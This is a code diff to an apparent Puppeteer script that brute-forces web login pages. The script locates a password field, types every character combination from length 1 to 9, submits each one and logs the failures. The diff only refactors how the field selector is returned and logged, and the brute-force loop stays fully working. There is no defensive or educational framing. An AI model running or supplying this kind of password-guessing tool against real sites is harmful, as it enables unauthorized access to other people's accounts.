@@ -29,7 +29,7 @@ function generateCombinations(length) {
   await page.goto('page url', { waitUntil: 'networkidle2' });
 
   // Identify the password-related input field
-  const passwordSelector = await page.evaluate(() => {
+  const passwordDetails = await page.evaluate(() => {
     // Search for an input element containing "password" in its attributes
     const passwordInput = Array.from(document.querySelectorAll('input')).find(input => {
       const typeAttr = input.getAttribute('type') || '';
@@ -40,24 +40,30 @@ function generateCombinations(length) {
       return typeAttr.includes('password') || nameAttr.includes('password') || idAttr.includes('password');
     });
 
-    // Return the appropriate selector if the element exists
+    // If the element exists, return selector and additional details
     if (passwordInput) {
-      return passwordInput.getAttribute('name') 
-        ? `input[name="${passwordInput.getAttribute('name')}"]`
-        : passwordInput.getAttribute('id') 
-          ? `input#${passwordInput.getAttribute('id')}`
-          : null;
+      return {
+        selector: passwordInput.getAttribute('name') 
+          ? `input[name="${passwordInput.getAttribute('name')}"]`
+          : passwordInput.getAttribute('id') 
+            ? `input#${passwordInput.getAttribute('id')}`
+            : null,
+        name: passwordInput.getAttribute('name') || null,
+        id: passwordInput.getAttribute('id') || null,
+        type: passwordInput.getAttribute('type') || null
+      };
     }
     return null;
   });
 
-  if (!passwordSelector) {
+  if (!passwordDetails || !passwordDetails.selector) {
     console.log('No password-related input found.');
     await browser.close();
     return;
   }
 
-  console.log('Password-related selector found:', passwordSelector);
+  console.log('Password-related selector found:', passwordDetails.selector);
+  console.log('Additional Details:', passwordDetails);
 
   // Try all possible password combinations from length 1 to 9
   for (let length = 1; length <= 9; length++) {
@@ -67,7 +73,7 @@ function generateCombinations(length) {
     for (const password of generatedCombinations) {
       console.log('Trying password:', password);
 
-      await page.type(passwordSelector, password); // Use the found selector to type the password
+      await page.type(passwordDetails.selector, password); // Use the found selector to type the password
       await page.click('button[type="submit"]');   // Click the submit button
 
       try {
@@ -79,7 +85,7 @@ function generateCombinations(length) {
         console.log('Incorrect password:', password);
         await page.evaluate(selector => {
           document.querySelector(selector).value = '';
-        }, passwordSelector); // Clear the password field for the next attempt
+        }, passwordDetails.selector); // Clear the password field for the next attempt
       }
     }
   }
